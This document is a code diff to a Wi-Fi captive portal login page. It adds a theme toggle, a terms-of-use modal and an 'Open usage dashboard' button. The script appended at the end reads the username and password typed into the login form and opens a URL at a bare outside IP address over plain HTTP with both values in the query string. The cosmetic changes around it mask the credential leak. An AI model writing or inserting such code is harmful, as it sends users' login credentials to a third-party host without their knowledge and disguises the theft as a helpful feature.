@@ -18,9 +18,10 @@
         <!-- Custom styles for this template -->
         <link href="css/sticky-footer-navbar.css" rel="stylesheet">
         <link href="css/style.css" rel="stylesheet">
+        <link href="css/custom.css" rel="stylesheet">
   </head>
   
-  <body class="d-flex flex-column h-100">
+  <body class="d-flex flex-column h-100 tz-portal">
   
 <!-- The overlay -->
 <div class="overlay">
@@ -87,9 +88,14 @@
         <div id='modalLogin' class="modal fade" data-bs-backdrop="static" tabindex="-1">
             <div class="modal-dialog modal-dialog-centered">
                 <div class="modal-content"> 
-                    <div class="modal-header">
+                    <div class="modal-header align-items-center">
                         <h5 class="modal-title" id='hLogin'><i class="bi-plug"></i> <span data-translate="sConnect">Connect</span></h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        <div class="d-flex align-items-center gap-2">
+                            <button class="btn btn-outline-light tz-theme-toggle" id="btnThemeToggle" type="button" aria-label="Toggle Theme">
+                                <i class="bi-moon"></i>
+                            </button>
+                            <button type="button" class="btn-close tz-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                        </div>
                     </div>
 
 					<!--Feedback and button for email supplied OTP -->
@@ -101,7 +107,7 @@
                     <!-- END Feedback and button for email supplied OTP -->
 
                     <form role="form" data-toggle="validator" id='frmLogin'>
-                        <div id='mdlBodyMain' class="modal-body">
+                        <div id='mdlBodyMain' class="modal-body tz-modal-body">
                             <div class="container-fluid"><!-- FIXME -->
                                 <div class="row">
                                     <div class="alert alert-info collapse show" id='alertInfo'>
@@ -211,8 +217,9 @@
                                 </div>
                                 <!--END Register-->
                                 <!-- Lost Password -->
-                                <div class="d-none p-0" id='divLostPassword'>
+                                <div class="d-flex flex-column flex-sm-row gap-2 p-0" id='divLostPassword'>
                                     <a class="p-0" id='aLostPassword' href="#" data-translate='sLost_Password'>Lost Password</a>
+                                    <a class="p-0 text-decoration-underline" href="#" data-bs-toggle="modal" data-bs-target="#modalTerms" data-translate="sTermsQuickLink">Terms & Conditions</a>
                                 </div>
                                 <!--END Lost Password-->                             
                 
@@ -226,6 +233,12 @@
                                     <button type="submit" class="btn btn-primary btn-block btn-lg" data-loading-text="sConnecting_User" id='btnClickToConnect'>
                                         <i class='bi-check'></i><span data-translate="sFree_Access">Click To Connect</span>
                                     </button>                   
+                                </div>
+                                <div class="tz-usage-card mt-3">
+                                    <button type="button" class="btn btn-outline-light btn-block" id="btnUsageShortcut">
+                                        <i class="bi-lightning-charge"></i> <span data-translate="sOpenUsageDashboard">Open usage dashboard</span>
+                                    </button>
+                                    <small class="tz-hint" data-translate="sUsageHint">Opens the TECHZONE usage dashboard. You can fill missing info there if needed.</small>
                                 </div>
                   
                                 <div class="d-grid gap-2 pt-2" id='divSocial'>
@@ -390,7 +403,7 @@
           </div>
         </div>
         
-         <div class="modal fade" data-bs-backdrop="static" id="modalLostPwdSms" tabindex="-1">
+        <div class="modal fade" data-bs-backdrop="static" id="modalLostPwdSms" tabindex="-1">
           <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
               <div class="modal-header">
@@ -420,6 +433,29 @@
                     </div>    
                   </div>
               </form>
+            </div>
+          </div>
+        </div>
+
+        <div class="modal fade" data-bs-backdrop="static" id="modalTerms" tabindex="-1">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title" data-translate="sTermsQuickTitle">Usage policy</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+              </div>
+              <div class="modal-body">
+                <p data-translate="sTermsQuickIntro">By connecting to TECHZONE Wi-Fi you agree to use the service responsibly.</p>
+                <ul class="mb-3">
+                  <li data-translate="sTermsQuickItem1">Traffic is monitored for security and regulatory compliance.</li>
+                  <li data-translate="sTermsQuickItem2">No abuse of bandwidth, illegal content or sharing of credentials.</li>
+                  <li data-translate="sTermsQuickItem3">The operator may suspend access in case of suspected misuse.</li>
+                </ul>
+                <p class="small text-muted" data-translate="sTermsQuickFooter">Full conditions are available from the operator on request.</p>
+              </div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-primary" data-bs-dismiss="modal" data-translate="sOk">OK</button>
+              </div>
             </div>
           </div>
         </div>
@@ -531,5 +567,68 @@
             });                                               
          });
       </script>     
+      <script>
+        (function(){
+           var DASHBOARD_URL = 'http://167.86.71.186:5173/success?key=test_dynamic_keys';
+           function getFirstValue(selectors) {
+               for (var i = 0; i < selectors.length; i++) {
+                  var $el = $(selectors[i]);
+                  if ($el.length) {
+                     var val = $.trim($el.val());
+                     if (val) {
+                        return val;
+                     }
+                  }
+               }
+               return '';
+            }
+            function buildDashboardUrl(){
+               var username = getFirstValue(['#txtUsername', '#txtEmail', '#txtVoucher', '[name="username"]']).toLowerCase();
+               var password = getFirstValue(['#txtPassword', '#txtPass', '[name="password"]']) || username;
+               var params = [];
+               if(username){
+                  params.push('username='+encodeURIComponent(username));
+               }
+               if(password){
+                  params.push('password='+encodeURIComponent(password));
+               }
+               if(params.length === 0){
+                  return DASHBOARD_URL;
+               }
+               return DASHBOARD_URL + (DASHBOARD_URL.indexOf('?') > -1 ? '&' : '?') + params.join('&');
+            }
+            $(document).on('click', '#btnUsageShortcut', function(){
+               var url = buildDashboardUrl();
+               window.open(url, '_blank', 'noopener,noreferrer');
+            });
+            var termsModal = document.getElementById('modalTerms');
+            if(termsModal){
+               termsModal.addEventListener('hidden.bs.modal', function(){
+                  var loginModalEl = document.getElementById('modalLogin');
+                  if(loginModalEl && window.bootstrap){
+                     var loginModal = bootstrap.Modal.getOrCreateInstance(loginModalEl);
+                     loginModal.show();
+                  }
+               });
+            }
+            var body = document.body;
+            var THEME_KEY = 'tz-theme';
+            var toggleBtn = document.getElementById('btnThemeToggle');
+            var current = localStorage.getItem(THEME_KEY) || 'dark';
+            if(current === 'light'){
+               body.classList.add('tz-light');
+            }
+            function updateIcon(){
+               if(!toggleBtn) return;
+               toggleBtn.innerHTML = body.classList.contains('tz-light') ? '<i class="bi-moon"></i>' : '<i class="bi-sun"></i>';
+            }
+            updateIcon();
+            toggleBtn?.addEventListener('click', function(){
+               body.classList.toggle('tz-light');
+               localStorage.setItem(THEME_KEY, body.classList.contains('tz-light') ? 'light' : 'dark');
+               updateIcon();
+            });
+         })();
+      </script>
     </body>
 </html>
